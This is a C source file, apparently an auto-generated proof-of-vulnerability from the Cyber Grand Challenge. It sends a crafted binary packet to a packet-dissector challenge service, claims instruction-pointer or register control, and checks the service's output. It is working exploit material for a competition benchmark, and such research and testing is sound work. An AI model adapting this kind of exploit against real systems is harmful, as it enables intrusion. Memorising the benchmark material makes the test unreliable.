#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xe3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xcb\x01\x00\x00\xc3\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xc3\x01\x00\x00"
         "\xfa\xa8\xf0\xad\xfe\x10\xdd\xc3\x16\x89\x09\x90\x7d\x5c\x14\xac"
         "\x04\x3c\x74\xf5\x3b\x00\x00\x00\x1e\x72\x01\x00\xd5\x41\x00\x01"
         "\xbb\x01\x44\x95\x6e\x65\x52\x9d\x35\x19\xb8\x10\xdd\x6d\xe3\x4e"
         "\x91\x2f\x0d\x01\x00\x75\x3d\x5a\x4a\x56\x87\x0d\x22\xe3\x25\x07"
         "\xd2\x0c\x23\x47\x01\x72\x3c\x72\xf3\xa7\xe7\xb5\x78\xca\x68\x04"
         "\x73\x1d\x8b\x59\x7b\xf4\xff\x86\xed\x8e\x89\xce\x30\x76\x20\x01"
         "\xe8\x56\x1f\x73\x4d\x35\x4e\x47\x10\x30\xb0\x44\xda\x5e\xca\x10"
         "\x5d\xb5\x96\x73\x06\x94\x78\x64\x51\xe0\x13\x01\x00\x39\xbf\x32"
         "\x92\xe4\x99\x67\xff\xda\xdc\xd4\xf7\x28\x64\xdc\xad\x15\xca\xf5"
         "\x37\x7c\x12\xe3\xd3\x0e\xc4\x44\x0c\x1e\x68\xfa\x67\xaa\xb1\xc1"
         "\x96\x1b\x21\xb9\x63\xea\xde\xd8\xdb\x56\x65\x3f\xa0\xd6\x02\xac"
         "\x28\x46\x11\x8f\xac\xd0\xa0\xc5\x36\x3c\x26\xe1\x81\x4f\xcb\x78"
         "\x91\x38\x4c\x66\x68\xc5\x1e\xac\xa9\xd2\xd5\x71\x6f\xf2\x7a\x30"
         "\xd1\x47\x8c\xe8\xeb\x86\x68\x68\x04\xe0\x34\xdf\x45\x9c\xd2\x8f"
         "\x9f\xe1\xc4\x4d\xd9\x6d\xee\x49\xbf\x7c\x19\xb5\x40\xcd\x5d\x6e"
         "\xfa\xd6\x82\x5b\x41\x9f\x1f\xc5\x5e\xa5\x5c\x9a\xd9\x8b\x05\x74"
         "\x2c\xb4\x14\xeb\x81\x3e\x94\x14\xe8\x56\x98\x9b\xfd\xc3\xf2\xf3"
         "\x79\x03\xbc\xf2\xa7\xe7\x61\xff\xcc\x28\x41\x6b\x45\x3d\x0c\xb0"
         "\x3e\x5f\xdf\x56\xd0\x60\xfa\x01\x91\x87\x6e\x83\x8a\x1b\x26\x1e"
         "\xef\x2c\xaa\xbf\x29\x53\xfa\x1f\x7e\xda\xf7\x0e\x24\xc8\x81\xbd"
         "\xdb\x0c\x59\xb7\x1f\x02\xaa\xfa\x08\x35\xc1\x04\x9a\x29\x4b\x15"
         "\x62\x53\x8c\x40\x87\x93\x0a\x16\xf2\xd5\x7f\xa0\xdc\xf8\xb8\xf9"
         "\xd0\xcc\x4f\xc4\x84\xb9\x1f\x51\x2b\x6e\x11\x62\x31\xf9\x06\x18"
         "\x3e\x31\x9d\x61\x23\xae\xef\x89\x6f\x3c\x72\xad\xde\xb7\xf1\x48"
         "\x0e\x61\x06\xe7\x01\xb2\x14\xe9\x73\x31\xe6\x74\xcf\x2d\x02\x99"
         "\xd0\x91\x38\x7d\x0a\x41\x5c\xc2\xa3\xd1\x01\x00\x82\x41\x00\x74"
         "\x78\x54\x5a\x7f\xd3\x69\xfd\x5b\x33\x57\x15\xf8\x81\xd6\x27\x44"
         "\x24\xd0\x79\xaf\x2d\x9e\x39\x7b\x95\xae\xd4\x1e\x1f\xa9\x9d\xb4"
         "\x3e\x99\x58";
      static unsigned int write_00001_00000_len = 483;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaintracutaneous
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x69\x6e\x74\x72\x61\x63"
         "\x75\x74\x61\x6e\x65\x6f\x75\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
